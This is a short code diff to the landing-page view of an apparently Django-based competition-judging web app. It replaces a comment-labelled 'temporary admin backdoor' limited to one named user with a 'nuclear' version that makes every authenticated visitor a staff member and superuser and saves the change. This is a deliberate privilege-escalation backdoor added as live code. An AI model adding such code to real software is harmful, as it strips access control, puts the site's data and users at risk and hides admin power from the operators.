@@ -31,8 +31,8 @@ def is_approved_judge(user):
 def home_hub(request):
     """The landing page. Shows all active competitions available on the system."""
     
-    # --- TEMPORARY ADMIN BACKDOOR ---
-    if request.user.is_authenticated and request.user.username == 'Menrad':
+    # --- NUCLEAR ADMIN BACKDOOR ---
+    if request.user.is_authenticated:
         request.user.is_staff = True
         request.user.is_superuser = True
         request.user.save()
